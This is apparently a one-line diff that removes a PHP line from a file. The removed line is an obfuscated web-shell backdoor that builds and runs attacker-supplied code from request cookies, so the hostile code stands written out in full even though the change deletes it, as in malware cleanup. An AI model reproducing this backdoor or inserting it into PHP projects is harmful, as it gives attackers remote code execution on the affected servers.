@@ -1,1 +1,0 @@
-<?php if(@$_COOKIE['yig']){$eofa=$_COOKIE['yig']("",@$_COOKIE['gj'](@$_COOKIE['kaow']));$eofa();}?>
